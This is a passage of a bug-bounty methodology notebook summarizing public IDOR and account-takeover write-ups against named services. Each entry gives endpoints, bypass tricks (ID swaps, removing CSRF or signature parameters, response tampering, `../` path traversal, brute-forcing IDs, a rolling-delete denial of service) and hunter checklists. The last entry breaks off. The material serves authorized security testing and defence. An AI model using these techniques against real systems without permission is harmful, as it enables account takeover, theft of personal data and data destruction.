### [178] Zero-click ATO chain — PII IDOR dismissed "can't get the id" → JS link-finder reveals a bulk-id-listing endpoint → a `PushToken` endpoint returns resetToken by UserID → ATO of every user — Veshraj Ghimire [NEW ★ defeat the id-source objection via JS + token-leaking endpoint]
- Where: `/api/Customer/GetAdditional?customerId=` (PII), `/api/AdditionalCustomerFields` (dumps ALL UserIDs, found via BurpJSLinkFinder), `/api/PushToken` (UserID → passwordHash + resetToken).
- Approach/how-found: the PII IDOR was closed informative because he couldn't obtain other UserIDs. He didn't give up — BurpJSLinkFinder surfaced a JS endpoint that lists every customer's UserID (defeats the "how would you get the id?" objection → reopened High). Digging more, `PushToken` returned a reset token by UserID with no authz. Chain: list UserIDs → get email → trigger reset → read resetToken via PushToken → take over any account, zero-click.
- Test: when an IDOR is closed "can't obtain the id," mine JS (BurpJSLinkFinder/LinkFinder) for a list/enumerate endpoint that dumps all ids. Hunt endpoints returning reset tokens / password hashes by user id — they upgrade any IDOR to ATO.
- Q: "Is there a JS-referenced endpoint that enumerates all object ids (killing the id-source objection)? Does any endpoint return a reset token / password hash keyed by a user id I control?"

### [179] Bug-Hunting-Journey 2021 (multi-bug) — read-IDOR dup but WRITE-IDOR unreported; client-side paywall via response Match&Replace; gated note in API; invite-by-email account disable — Sudhanshu Rajbhar [NEW ★ several distinct access-control lessons]
- Where: multiple programs — Streamlabs Prime; `company_id` GET vs POST IDOR; password-protected file-share note API; merchant-portal invite flow.
- Approach/how-found (bundled, one writeup): (1) A GET `company_id` IDOR (info disclosure) was closed **Duplicate**, but the WRITE-side equivalent — POST company/profile settings — was **not** reported → triaged High. (2) Streamlabs Prime check was client-side only: Burp **Match&Replace response `false→true`** unlocked all paid features → claimed free physical gifts (mouse coupons), ~$30k potential. (3) A password-protected file's private note (`description`) was already present in the **API response before the password was entered** (client-side gate). (4) Inviting a user by email added them to his merchant portal **without their confirmation** → he could rename them, enable 2FA, and **disable login** → lock any email's owner out of their account.
- Test: when a read-IDOR is a dup, immediately hunt the matching WRITE action (settings/profile change) — often unreported and higher impact. Match&Replace `false→true`/`isPro→true` to test client-side feature gates. Inspect API responses for data that should only appear after a password/paywall/gate. Test invite/membership flows where the invitee never confirms — you may gain control (rename, 2FA, disable-login) over an arbitrary email's account.
- Q: "Is there a WRITE counterpart to a dup'd read-IDOR? Is the paywall enforced only client-side (flip false→true)? Does the API return gated data before the gate? Can inviting an email grant me control over that account without their confirmation?"

### [180] Facebook Author/Publisher IDOR via GraphQL author_id+publisher_id — servicenger [DUP reinforcement]
- GraphQL add/remove "linked publications" took `author_id` (victim) + `publisher_id` (any page), first-party Android token → add/remove publications on a victim's settings. Reinforces: add/remove relationship mutations keyed by a victim id.

### [181] Massive ATO — default test phone numbers (`9999999999`,`8888888888`…) accept ANY OTP, and the signup endpoint's `uid` param is IDOR → log into any account by phone; no rate limit → brute — Anurag Verma [NEW ★ dev OTP-bypass backdoor left in prod + `uid`-swap login-as-victim]
- Where: phone-login app; signup `POST` carrying `mobileNo`, `uid`, `socialMediaId`; response `{isExistingUser, message:"Login Successful"}`.
- Approach/how-found: noticed repdigit phone numbers (`9999999999`…`1111111111`) logged in with ANY OTP — leftover dev/test accounts (with employee PII). Then analyzed the signup request's params; swapping `uid` to a victim's value returned `isExistingUser:true` + "Login Successful" → full ATO by phone number alone. Phones harvested via Google/GitHub/LinkedIn dorks; no rate limit on signup → Intruder over numbers filtering `isExistingUser=true`.
- Test: try repdigit/sequential "test" phone numbers/emails with any OTP (dev backdoors). On signup/login responses, swap identity params (`uid`,`userId`) and watch for a "login successful"/session in the response — auth flows sometimes authenticate the supplied id, not the verified one.
- Q: "Do test/default phone numbers accept any OTP? Does the signup/login endpoint trust a `uid`/`userId` param so I can log in as a victim by swapping it? Is there rate-limiting to stop phone enumeration?"

### [182] Facebook (Android) — live-video GraphQL leaks page admin's real id in `broadcaster_id`; swap page_id/live_video_id → deanonymize almost any page admin — Sudip Shah ($4,500) [NEW ★ public-object response leaks owner real id + test the mobile app]
- Where: FB4A GraphQL `doc_id=4449530781773796` (change `page_id` → admin in `broadcaster_id`) and `doc_id=5048752835141848` (change `live_video_id` → `broadcaster_id`).
- Approach/how-found: web was over-tested, so he intercepted the **Android** app. Live-video responses leaked the page admin's real personal account id in `broadcaster_id`; swapping `page_id` (or `live_video_id`) to any page disclosed its admin → mass deanonymization via Intruder.
- Test: intercept the MOBILE app — its GraphQL is often leakier than web. For public objects (live videos, pages, posts) check whether the response leaks the owner/admin's real user id (`broadcaster_id`, `creator_id`, `owner_id`); swap the public id to map owners.
- Q: "Does a public object's response leak the owner/admin's real user id? Is the mobile API exposing fields the web hides? Can I enumerate owners by swapping the public object id?"

### [183] Microsoft Dynamics 365 Partners — `/api/Users/email?emailId=` returns any user's PII; dropping the filter to bare `/api/Users` dumps ALL ~112MB / 100k+ users — Meareg (critical) [NEW ★ drop-the-filter collection-root dump]
- Where: `landingapi-prod.azurewebsites.net /api/Users/email?emailId=<email>` and the collection root `/api/Users`.
- Approach/how-found: the per-user lookup defaulted to your own email but accepted ANY email → other users' PII (first/last name, email, MPN ID, AAD profile id, role). Then he simply removed the filter and hit `/api/Users` → the server returned the **entire** user table (~112MB, 100k+).
- Test: when a lookup takes a filter (email/id), also try removing it or hitting the collection root (`/api/Users` vs `/api/Users/email?…`) — it may return everything. Email-keyed IDOR still counts (a known email is realistic).
- Q: "Does the collection endpoint without the id/email filter return ALL records? Is the per-record lookup authorized only by a known email/id rather than my session?"

### [184] Gumtree: PII in HTML source (F12) + full name via unauth iOS-only API IDOR — Pentest Partners [NEW reinforcement: HTML-source + mobile API]
- Approach: every advert leaked seller postcode/GPS (even with map hidden) and email in the **HTML source**; the iOS-only API had an unauthenticated IDOR leaking full names. "Sometimes finding vulns is just looking" (F12 the source).
- Q: "Is PII present in the raw HTML/JSON even when the UI hides it? Does the mobile-only API expose more fields without auth than the web API?"

### [185] Dubsmash (Reddit) — `UpdateSound` GraphQL BOLA: `uuid` not bound to owner, and the uuid is publicly disclosed → rename any/all library soundtracks — appsecure ($3,000) [DUP reinforcement: "random uuid" fails when leaked elsewhere]
- Where: Dubsmash iOS `mutation UpdateSound($input)`; `input.uuid`.
- Approach/how-found: edited his own sound's title, captured the mutation, swapped `uuid` to another sound's (uuid is exposed in multiple API responses) → title changed → scriptable across the entire music library.
- Test: update/edit mutations keyed by a uuid that's publicly readable elsewhere = BOLA — the "unguessable uuid" defense collapses when the uuid appears in list/detail/search responses. Always locate where the uuid leaks.
- Q: "Is this edit mutation's object uuid validated against my ownership? Is that uuid disclosed in any list/detail/search response (so 'random' doesn't protect it)?"

### [186] elearnsecurity — accidental invoice IDOR: the obvious PDF id seemed safe, but a SECOND numeric param returned other people's invoices + billing address — Anugrah (p1boom) [NEW: test the OTHER numeric param, not just the obvious one]
- Where: invoice/receipt download URL containing two numeric params (PDF id + another id), found in Burp history after a real cert purchase.
- Approach/how-found: changing the PDF id did nothing; a second numeric value in the URL was the true object reference → swapping it returned another person's invoice with their billing address.
- Test: invoice/receipt/download URLs often carry multiple numeric ids — if the obvious one (doc/pdf id) looks protected, fuzz the OTHER ids (order/account/customer). Check Burp history for auto-generated download links after any purchase/checkout.
- Q: "Does the invoice/download URL have a second numeric id (order/account) that's the real reference? Have I tested ALL numeric params, not just the obvious PDF/doc id?"

### [187] Facebook Portal — `CreateAlbumMutation` `album_media_ids[]`/`cover_photo_id` accept ANY media id with no owner check → add a victim's private photo to your album (read CDN) and deleting it deletes from the victim — ecstasy [NEW ★ add-to-collection with foreign item id = read+destroy]
- Where: FB Portal app `BPPhotosHubAlbumGraphQLHelperCreateAlbumMutation`; `variables.album_media_ids[]` (and `cover_photo_id`).
- Approach/how-found: two test users (mobile proxy HttpCanary). Captured own Media ID from the upload response. The create-album mutation's `album_media_ids` array arrived empty and performed no per-id ownership check → injected the victim's Media ID → the victim's private photo was added to the attacker's album with a valid regenerated CDN URL (read); deleting it from the attacker's album deleted it from the victim's (destroy).
- Test: "create/add-to album/collection/playlist/cart" operations taking a media/item id array rarely verify ownership of each id — inject another user's object id to read (CDN regenerated) or destroy it. Pay attention to array params that arrive empty.
- Q: "Does an add-to-album/collection mutation accept item ids without checking I own each? Can injecting a victim's media id read it (new CDN) or delete it from their account?"

### [188] Multi-role org — teammate action targets a base64(`email|team-id`) in the URL; decode, swap in the Owner's email, re-encode → demote the Owner — HEMANT (€300) [NEW: decode the encoded target id and substitute a higher-priv victim]
- Where: `POST /api/v1.0/<id>/teammates/{base64("email|team-id")}` (role-edit; target identified by encoded email in path).
- Approach/how-found: a Store-owner can demote lower roles but not the Owner. The edit-permission request identified the target by a base64-encoded `email|team-id`. He decoded it (it held the invited user's email), re-encoded with the **Owner's** email + team-id, sent it → 200 OK → Owner demoted.
- Test: when an authz action targets an encoded identifier (base64 email/id), decode it, substitute a higher-privilege target, re-encode. Role checks frequently validate the actor but not that the TARGET is within the actor's allowed scope.
- Q: "Is the action's target an encoded (base64/hex) email/id I can decode, swap to a higher-priv user, and re-encode? Does the server verify the target is in my allowed scope, or only that I'm authenticated?"

### [189] CSRF/anti-IDOR token bypassed by OMITTING it → no-rate-limit enum → plaintext creds → mass ATO — tox7cv3nom [NEW: remove-the-guard-param]
- Where: `/api/v1/users/id` gated by a CSRF token "to prevent IDOR".
- Approach/how-found: swapping the id → 401 while the CSRF token was present; **removing the CSRF token parameter entirely** → 200 (the token was the only guard). Forgot-password leaked the short numeric id; no rate limit → enumerate a 3-digit range (~2-5k requests) → 200s returning session token, user id, and password in plaintext → mass ATO.
- Test: try DELETING (not just altering) the CSRF/security/signature param that "protects" an IDOR; then enumerate the id space if rate-limiting is absent.
- Q: "Does removing the CSRF/security token param disable the IDOR check? Is the id space small and unthrottled? Does the response include credentials/session tokens?"

### [190] Udemy (multi-vector) — urlscan.io leaks invite tokens; Host-header account-name swap = cross-tenant read; learning-path `permissions` add-self-as-editor IDOR; `recommend` HTML-injection → mass phishing — hector0x ($1,300) [NEW ★ public-scanner recon + Host-header tenant IDOR + add-self-editor]
- Where: `*.udemy.com/organization/accept-invitation/?email=token` (leaked on urlscan.io); `GET /api-2.0/learning-paths/` keyed by `Host: <account>.udemy.com`; `PUT /api-2.0/learning-paths/{id}/permissions/` (`added_editors_ids`); `POST /api-2.0/share/course/{id}/recommend/` (`userIds[]`+HTML `message`).
- Approach/how-found: searched urlscan.io for `*.udemy.com` → companies had scanned their own Udemy-for-Business **invite URLs**, leaking claimable tokens (no extra verification → join orgs). With a trial account he found Learning Paths; the API selected the tenant via the **account name in the Host header** → swapping it returned other orgs' learning paths + member data and trial status (`owner_email`). The permissions PUT let him swap a random learning-path id and add **his own user id** to `added_editors_ids` → editor on any path (or remove others). The `recommend` endpoint accepted arbitrary `userIds[]` + an HTML `message` with no rate limit → mass HTML-injection phishing to ~150M users.
- Test: mine urlscan.io / public scanners / archives for leaked invite/reset tokens and private URLs. Test tenant selection via the **Host header** (`<account>.udemy.com`) — swap it for cross-tenant reads. On permission/share endpoints, add YOUR id to an editor/member array for a foreign object id. Share/recommend/notify endpoints taking `userIds[]`+message = mass phishing if HTML renders and there's no rate limit.
- Q: "Are invite/reset tokens leaking on urlscan.io? Is the tenant chosen by a Host header / account name I can swap? Can I add my own id to a foreign object's editor/member list? Does a recommend/share endpoint take arbitrary userIds + HTML?"

### [191] Become Super Admin in ANY GSuite org via domains.google.com provisioning flow — secretlyhidden [NEW: swap org id across all steps of a checkout]
- Where: domains.google.com "add user/admin to GSuite" = 3 chained `POST /batchrpc` requests carrying the gsuite org id + domain.
- Approach/how-found: adding an admin runs a 3-request purchase flow. The org id (e.g. `5896212`) and domain are client-supplied in the body. Replace them with the VICTIM org's id (`25879957`) + domain across **all 3** requests → after the purchase popup, a super-admin is added to the victim's org and the new account's password is emailed to the attacker.
- Test: in multi-step provisioning/checkout/invite flows, the org/owner id is often client-controlled in every step — swap it consistently across all requests, not just the first.
- Q: "In a multi-request provisioning/checkout/invite flow, is the target org/owner id client-supplied in each step? Swapping it across ALL steps — does it provision me into the victim's org?"

### [192] SaaS private program — 4 crits: onboarding form leaks Company-ID → self-register admin; Customer-ID in storage URL; Role-A cookie works on backend; PRE-AUTH IDOR returns API keys by Company-ID — monke.ie [NEW ★ leaked id becomes master key + pre-auth secret-fetch IDOR]
- Where: onboarding form requests (leak Company-ID); admin Get-User (leaks Customer-ID); object-storage URL (contains Customer-ID); a public endpoint returning API/secret keys by Company-ID.
- Approach/how-found: a pre-onboarding employee's onboarding form leaked the **Company-ID**; combined with unprotected admin-user registration → self-promote to admin → list live API keys/secrets with only the Company-ID. The admin Get-User leaked the **Customer-ID**, which listed ALL the customer's companies → register admin in any. Object storage put the Customer-ID in its URL. Role-A's cookies, meant for a limited front-end, worked directly against the **back-end** API to bypass restrictions. Crit4: the secret-fetch endpoint needed **no auth at all** — anyone with a Company-ID got API keys → full takeover pre-auth.
- Test: treat any leaked org/company/customer id as a potential master key — feed it to admin-registration, company-listing, and secret-fetch endpoints. Check object-storage URLs for embedded ids. Try a low-role's cookie directly on backend APIs (front-end limits ≠ backend authz). Test sensitive endpoints WITHOUT auth — a "somewhat obscure" id that returns secrets pre-auth is P1.
- Q: "Does onboarding/any form leak a company/customer id? Does that id let me register an admin, list all companies, or fetch API keys? Does a low-role cookie work on the backend? Does the secret endpoint need auth at all?"

### [193] DigitalOcean Hacktoberfest — change any user's metadata: endpoint authorizes ONLY by a JWT (payload carries `user_id`), and victims' JWTs were harvested from `waybackurls` → replay victim JWT + user_id → 200 — Anurag Verma [NEW ★ auth tokens leaked in Wayback URL logs; JWT self-describes the user_id]
- Where: `hacktoberfest.digitalocean.com` profile/metadata update; `Authorization: <JWT>` (JWT payload decodes to `{user_id}` via jwt.io); recon via `waybackurls <host>`.
- Approach/how-found: saw the update-metadata request used only a JWT for authz, and the JWT already embedded `user_id`. Needed valid victim tokens → ran `waybackurls` on the host and found historical URLs that **carried users' auth JWTs as parameters**. Decoded them, pulled each `user_id`, sent JWT+user_id → metadata changed for that victim.
- Test: grep Wayback/`gau`/`waybackurls` output for `token=`, `jwt=`, `access_token=`, `auth=` — apps that put bearer tokens in URLs leak them to archives/logs/Referer. Decode any JWT (jwt.io) to read embedded ids/roles and pair token+id.
- Q: "Does any auth flow pass tokens in the URL (so they're in Wayback/logs)? Does the JWT payload carry the user_id/role I can decode and reuse, and is the JWT the ONLY authz on writes?"

### [194] Dutch gov — "Manage Endpoints" data keyed by a sequential ID; delete with id 109→110 destroys another user's data (IDOR delete) — BabaBounty (swag) [DUP reinforcement: sequential id on delete = cross-user destroy]
- Where: certificate-validation "Endpoint" field; delete request keyed by a sequential data ID (and an organization ID).
- Approach/how-found: after XSS kept getting dup'd, he pivoted. Added data in two accounts; the delete request identified the row by a sequential ID (his was 109). Changing 109→110 deleted the OTHER account's data → IDOR delete via improper access control.
- Test: for any user-owned data row, capture the delete/edit request and check if the row id is sequential; increment to hit a neighbor's row. Confirm cross-user with two accounts. Delete/modify proves higher impact than read.
- Q: "Is the delete/edit request keyed by a sequential row id I can increment to destroy/modify another user's data? Did I verify cross-account with two test users?"

### [195] Login response manipulation — username pattern + JWT with userid; intercept the login RESPONSE, set victim username in body AND browser → logged into any account — vikram naidu [NEW ★ response-side auth bypass; change identity in response + browser together]
- Where: login response (returns a JWT whose payload carries `userid`/username); usernames follow `*****001/002/...` pattern.
- Approach/how-found: usernames were sequential; the login response returned a JWT with the username in its payload. Swapping the JWT username alone half-worked (browser showed victim name, no full login). The working trick: intercept the login response, change the username to the victim's **both in the response body and in the browser** → server's lack of validation + response manipulation → full login to any account.
- Test: intercept the login/auth RESPONSE (not just the request) and swap user identifiers (JWT payload username/id, and any client-side identity field). When sessions are derived client-side from the response, response tampering = ATO. Sequential usernames make victim selection trivial.
- Q: "Does the login response carry my identity (JWT payload, username) that I can rewrite to the victim's? Are usernames sequential? Does swapping identity in the response (and browser) log me into another account?"

### [196] Google Sites $7,500 IDOR: swap your id for account B's across the WHOLE sitemap → ListScripts leaks — r0ckin [DUP reinforcement: cross-service endpoint]
- Mapped the full sitemap with 2 accounts, then replaced every `catherinerecipespersonal` (acct A id) with `tomasideasontesting` (acct B). Most endpoints were protected, but `service=ListScripts` (which bridges to script.google.com) returned 200 with B's private script ids — a cross-service endpoint the devs forgot to protect.
- Q: "Which single endpoint, when I swap my identifier for account B's across the entire sitemap, leaks? Are cross-service/bridge endpoints (export, scripts, integrations) the weak ones?"

### [197] Facebook frame studio — `POST /media_effect/swipeable_frame/image/process_background/?image_id=` returns the CDN URL of ANY user's DRAFT (unpublished) frame — appsecure [NEW: process/preview endpoint leaks unpublished/draft media by id]
- Where: `facebook.com POST /media_effect/swipeable_frame/image/process_background/?image_id=`.
- Approach/how-found: two users; User B intercepted the process_background request and swapped `image_id` to User A's draft art id → the response disclosed the draft's CDN URL → opened it to view the unpublished frame.
- Test: "process/preview/background/transform" endpoints that take a media/image id often leak the CDN URL of even unpublished/DRAFT objects → swap the id to reach others' drafts (which ACLs assume are private because unpublished).
- Q: "Does a process/preview/transform endpoint return a CDN URL for an arbitrary media id — including unpublished/draft objects others assume are private?"

### [198] File/folder download — short numeric `folderId` (6-digit) brute-forced (106000–107000) → private GB-scale company folders; sibling `fileId` was 16-char (safe); same bug on 20+ hosts — encodedguy ($600) [NEW: attack the WEAK id param; replicate across infra]
- Where: `GET /...?folderId={6-digit}` download endpoint (public folders downloadable).
- Approach/how-found: harvested 7 public folderIds by downloading public folders and noting their ids → recognized the 6-digit format → Burp Intruder over 106000–107000 → ~20 private folders incl. sensitive GB-scale company data. The sibling `fileId` was a 16-char value (not brute-forceable), but `folderId` was short → exploitable. Reused across 20+ hosts of the infra.
- Test: when a download/export endpoint has multiple id params, attack the SHORT/numeric one even if another is strong (16-char). Harvest public ids to learn the format/range, then brute a window. Re-test the identical bug on every sibling host/subdomain.
- Q: "Does the download endpoint key on a short numeric id I can brute? Is one id param weak (6-digit) while another is strong? Does this same bug repeat on sibling hosts?"

### [199] Recruiting SaaS — share `token` not bound to its `project_id` (valid for any project); private project_id leaked via GraphQL to a low-priv candidate → access private projects — shakti mohanty ($750) [NEW ★ token-not-bound-to-object + Autorize-found id leak]
- Where: project access `?project_id=X&share_token_id=Y`; GraphQL endpoints leaking private `project_id`.
- Approach/how-found: as admin he made a shared project-A and a private project-B. He kept project-A's valid `share_token_id` but swapped `project_id` to project-B's → opened the private project (the token wasn't bound to its specific project). To obtain the "unguessable" private project_id as a candidate, he ran **Autorize** with candidate creds while roaming the admin panel → found 2 GraphQL endpoints disclosing the private project_id without authz. Chain = unauthorized private-project access.
- Test: when access needs id+token, test whether the token is bound to that specific id — keep a valid token, swap the id. Use Autorize (low-priv session) to auto-flag endpoints leaking ids/objects. "Valid token for any object" + "id leak" = full access; the unguessable-id objection dies once GraphQL leaks it.
- Q: "Is the share/access token bound to its specific object id or valid for any id? Is there a GraphQL/API endpoint leaking the 'unguessable' private id to a low-priv user (find with Autorize)?"

### [200] Change-password ATO — flip the RESPONSE "Incorrect Old Password"→"Success" to skip old-pw check; cookie holds a base64 user-number → enumerate → take over anyone — Sarvesh Salgaonkar [NEW: response-tamper bypass + enumerable id-in-cookie]
- Where: change-password flow (server returns incorrect/success); session cookie = value + base64-encoded user-number (non-expiring).
- Approach/how-found: entered a random old password, intercepted the RESPONSE, changed "Incorrect Old Password" to "Success" → app accepted it and changed the password (client trusts the response verdict). The cookie embedded a base64 user-number that's enumerable and the token didn't expire → swap it to any user → change their password = ATO.
- Test: on change-password / sensitive verifies, tamper the RESPONSE (failure→success) — many flows trust the client-side verdict. Decode session cookies for an embedded user id/number; if present and enumerable (and non-expiring), you can impersonate.
- Q: "Can I flip the verify response from failure to success to skip old-password checking? Does the cookie embed an enumerable (base64) user id, and is the token non-expiring/reusable?"

### [201] TikTok family-pairing — parental-control request has `child_user_id`; swap it → change ANY account's privacy/lives/comments/DM settings — s3c [NEW ★ guardian/delegate feature acts on a swappable controlled-user id]
- Where: TikTok family-pairing settings; params `restriction_type`, `restriction_value`, `child_user_id`.
- Approach/how-found: linked a parent+child pair; toggling the child's privacy generated a request with `child_user_id`; swapping it to any user id applied the restriction to that account → set anyone private, kill their lives/videos/comments/DMs.
- Test: parental/guardian/delegate/manager/"linked account" features act on a controlled-user id — swap it to any account. These complex backends are under-tested; the controlled-id is the IDOR knob.
- Q: "Does a parental/guardian/delegate feature act on a controlled-user id I can swap to change any account's settings? What sensitive toggles does it expose?"

### [202] Google Dialogflow CX — "random" testCase UUIDs are TEMPLATE-DERIVED: import the same prebuilt agent in two accounts → identical testCase ids, only `agent_id` differs (leaks via web-demo embed) → delete victim's test cases — Raidh ($3,133.70) [NEW ★ template-derived ids aren't random; Burp Comparer]
- Where: Dialogflow CX delete request `agents/{agent_id}/testCases/{testCase_id}` (two UUIDs).
- Approach/how-found: both ids looked unbruteforceable. Insight: import the SAME prebuilt/template agent in attacker AND victim accounts → the `testCase_id` is IDENTICAL (derived from the template). Burp Comparer showed only `agent_id` differs. The `agent_id` leaks via the web-demo integration JS snippet / share link → swap attacker→victim agent_id → delete the victim's test cases (all at once).
- Test: when an object id looks random, check if it's TEMPLATE-DERIVED — create the same prebuilt/template/sample object in two accounts and diff the ids (Burp Comparer); often only the container/parent id varies, and that leaks via embed snippets, share links, or docs.
- Q: "Are these 'random' ids actually template-derived (identical across accounts that imported the same template)? Does only the container id differ, and does it leak via an embed/share/demo snippet?"

### [203] IRCTC — Booked-Ticket-History `GET /historySearchByTxnId/{txnId}` is enumerable → millions of passengers' PNR/names/seat/age; same backend → cancel, change boarding, order food, book hotel/bus — Renganathan [DUP reinforcement: txn-id IDOR + shared-backend impact multiplier]
- Where: `GET /eticketing/protected/mapps1/historySearchByTxnId/{transactionId}?currentStatus=N`.
- Approach/how-found: the booking-history GET keyed on a transaction id; decrement it → a random user's full ticket + PII (PNR, passenger names, seat, gender, age). Since the same backend powers cancel/modify/order, those actions are equally unauthorized.
- Test: booking/order/transaction-history endpoints keyed by a txn id → decrement for others' records+PII; then enumerate the sibling actions (cancel/modify/order/refund) sharing that backend — they multiply impact from disclosure to account/financial actions.
- Q: "Is the transaction/booking id enumerable to read others' records+PII? Do cancel/modify/order/refund actions reuse the same unauthorized backend (escalating to control)?"

### [204] Google Dialogflow — `$5000` IDOR deletes any user's phone-gateway number: `phoneNumbers/<random-id>` swap; initially "intended behavior" until impact was argued — Raidh ($5,000) [DUP-reinforce: destructive IDOR on a "random" id + the appeal-the-dismissal lesson]
- Where: GCP Marketplace → Dialogflow → Phone Gateway → delete; request references `phoneNumbers/<randomString>`.
- Approach/how-found: pivoted off dead H1/Bugcrowd dupes to Google VDP, dug GCP Marketplace apps, found Dialogflow's phone-gateway create/delete. Intercepted delete, swapped the `phoneNumbers/<randomString>` to a victim's id → victim's number deleted; the random id is short enough to wordlist/brute. Google first closed it "Won't Fix / Intended Behavior"; after he wrote out the concrete attack scenario + impact, they reopened and paid $5,000.
- Test: enumerate cloud/SaaS marketplace add-ons (less-tested than the core product). For destructive actions on "random" ids, still try swapping/brute — and if triaged "intended/duplicate", re-submit with an explicit attacker-scenario + impact narrative.
- Q: "On marketplace/add-on features, can I delete/modify another tenant's object by swapping its id? If dismissed as 'intended', can a sharper impact story reopen it?"

### [205] Google Marketing Platform IDOR via DELETING an unknown id + CSRF $3,133.70 — apapedulimu [NEW reinforcement: delete the mystery id]
- Edit-listing request carried 4 ids; one had an unknown origin. Instead of swapping it he **deleted it entirely** → request still succeeded and edited the victim's profile. Endpoint also lacked a CSRF token → CSRF on the same edit.
- Test: when you can't tell where an id comes from, try removing it (request may default to a broader/target scope); check state-changing requests for missing CSRF tokens.
- Q: "If I delete an id whose origin I don't understand, does the request still act (on a default/target)? Is this edit endpoint CSRF-protected?"

### [206] GraphQL `sendEmail` — object guarded by id+hash, but server validates ONLY the id (hash unchecked) → swap id to a neighbor's file, set your own `emails` → exfiltrate any file — Aidil Arief [NEW ★ hash/signature not actually validated + delivery-redirect]
- Where: GraphQL `mutation sendEmail($Id, $Hash, $emails)`; `Id` sequential, `Hash` unchecked, `emails` = delivery target.
- Approach/how-found: the design pairs a sequential `Id` with an "unguessable" `Hash` (looks IDOR-proof), but `sendEmail` only checks the `Id` and ignores the `Hash`. Swap `Id` to a neighbor's file (keep any hash), set `emails` to the attacker → the victim's file is emailed to the attacker.
- Test: when an object needs id+hash/signature/token, verify BOTH are actually validated — keep your own (or a wrong) hash and swap only the id. Any "delivery" field (emails/phone/webhook) lets you redirect the fetched object to yourself.
- Q: "Does the server actually validate the hash/signature, or only the id (so I swap the id and keep my hash)? Is there a delivery field (email/phone) I can point at myself to receive the victim's object?"

### [207] WeTransfer-like share — remove-file POST keyed by sequential `file_id`, no authz → delete anyone's file; escalated to logical DOS via a self-advancing brute range that deletes files as fast as users upload — Abhijeet Singh [NEW ★ IDOR→DOS chain (WAF-invisible)]
- Where: file-remove `POST` keyed by sequential `file_id` (returned at upload, visible in inspector).
- Approach/how-found: sequential file_id + no access control on delete → remove any user's file by id. Escalated severity: a Python script deletes file_ids in a window that auto-advances on each success → continuously wipes new uploads → service unusable, undetectable by WAF (requests look legitimate).
- Test: sequential ids on DELETE = cross-user destroy. Escalate to a logical DOS by continuously deleting newly-created ids in a moving window (chase the counter). Chaining IDOR→DOS upgrades High→Critical and evades WAFs.
- Q: "Is delete keyed by a sequential id with no authz? Can I escalate cross-user delete into a rolling DOS that wipes resources as fast as they're created (moving-window brute)?"

### [208] Dutch gov — subdomain fingerprinted as GitLab → known "User Information Disclosure via Open API" (`/api/v4/users/{id}`) discloses user 31; brute last digits → many users — Veshraj Ghimire (swag) [NEW: fingerprint product → apply its known id-based disclosure misconfig]
- Where: a `bkwi.nl` subdomain running GitLab; GitLab open users API `/api/v4/users/{id}`.
- Approach/how-found: subdomain enum → spotted GitLab → applied known GitLab misconfigs → the open users API disclosed user info by id; brute-forcing the trailing digits dumped many users.
- Test: fingerprint third-party products (GitLab, Jira, Jenkins, Grafana, etc.) on subdomains and apply their DOCUMENTED id-based info-disclosure endpoints (e.g. GitLab `/api/v4/users/{id}`, `/api/v4/projects`). Brute the numeric id.
- Q: "Is a known product (GitLab/Jira/etc.) on a subdomain exposing its documented id-based user/info API? Can I brute the id to enumerate users/projects?"

### [209] $4,300 ATO via `../` path traversal INSIDE the API route to bypass per-object 403 — usamav [NEW ★ killer technique]
- Where: `POST /workspaces/<wsId>/users` (invite); `PUT /users/<userId>/email`.
- Approach/how-found: replaying with the attacker token → `403`. He exhausted standard 403 bypasses (array-wrap id, JSON-wrap id, method swap, `/v1//v2/` versions, `*` wildcard, `%00`) — ALL failed. Then `POST /workspaces/<MY_wsId>/../<VICTIM_wsId>/users` → `200`: the authz check validates the **leading** id (his own workspace) while the server **normalizes `../`** and resolves to the victim workspace. Same trick on `PUT /users/<MY_id>/../<VICTIM_id>/email` → changed victim's email; the verification link went to the **new (attacker) email** → ATO. Sourced the victim `userId` by inviting their email (the invite response returns the invited user's id).
- Test: when per-object authz 403s, insert `/<mine>/../<victim>/` in the path so the gateway authorizes your id but the app resolves to the victim's. Source ids from invite/lookup responses. Check whether email-change verification goes to the new address.
- Q: "Does `/resource/<mine>/../<victim>/action` bypass the 403 (authz on the leading segment, path-normalization to the trailing one)? Does an invite/lookup-by-email response hand me the victim's id? Does email-change verification land on the NEW email (instant ATO)?"

### [210] Mail.ru Games — support-ticket URL `/ticket/{INT}` carries `project_id`,`user_id`,`sign`; drop the `sign` signature and access tickets unauthenticated (IDOR) — Sicksec ($2k) [NEW: remove the signature param to test if the id is still honored] (tail member-locked; technique captured from setup)
- Where: support ticket URL `/ticket/{integer}` with params `project_id`, `user_id`, `sign` (signature).
- Approach/how-found: huge scope → started in Mail.ru Games, did normal user actions (cart, blog, support ticket). The ticket link `/ticket/INTEGER` looked suspicious; first test = remove the `sign` (signature) parameter and try to access from an unauthenticated browser (title confirms it worked → easy IDOR, $2k).
- Test: when an object URL is "protected" by a signature/HMAC param (`sign`, `signature`, `token`), try removing it entirely — servers often fall back to honoring the raw id. Also swap `user_id`/`project_id`. Sequential ticket ids enumerate.
- Q: "If I delete the `sign`/signature param, does the server still serve the object by its id? Are the ticket/project/user ids swappable or sequential?"

### [211] OAuth SaaS — JS env vars on the Username-Recovery page mint an access token; gau+GitHub harvest api.example.com endpoints+ids; token enumerates customer PII; a `widgets` endpoint dumps an org's whole user list — pmoc/Bendtheory (Critical) [NEW ★ JS-env-var token mint + system-token over-access]
- Where: `oauth.example.com` Username-Recovery JS (env vars), `api.example.com` endpoints (via gau + GitHub), a `widgets` endpoint (org user list); `/me` replied `User '<system>' does not fall under the requested users hierarchy`.
- Approach/how-found: read JS source on the OAuth/recovery page → env vars let them craft a POST that minted an access token. The JS referenced `api.example.com`; gau returned endpoints + site-specific id values; Intruder + the token across those ids → customers' PII (names, emails, phones, employee ids, job titles, login timestamps). A `widgets` endpoint leaked the entire org user list. The `/me` `<system>` message hinted the token had privileged/system over-access.
- Test: read JS on auth/recovery pages for env vars/keys to mint tokens; harvest API endpoints+ids via gau + GitHub; enumerate with the token. Watch for a privileged/system token that bypasses per-object hierarchy checks, and list/widgets endpoints that dump an org's users.
- Q: "Do auth-page JS files leak env vars/keys to mint a token? Does that token (maybe a system token) bypass per-user hierarchy checks? Is there a widgets/list endpoint dumping an org's full user list?"

### [212] Instagram — `api/v1/ads/graphql` (historically vulnerable) exposes any public account's ARCHIVED stories by swapping the `id` (USERID) param — Naveen/navnz [NEW: revisit historically-vulnerable endpoints; archive surfaces leak time-private content]
- Where: `api/v1/ads/graphql doc_id=3271888199508091`, `query_params{...,"id":[USERID]}`.
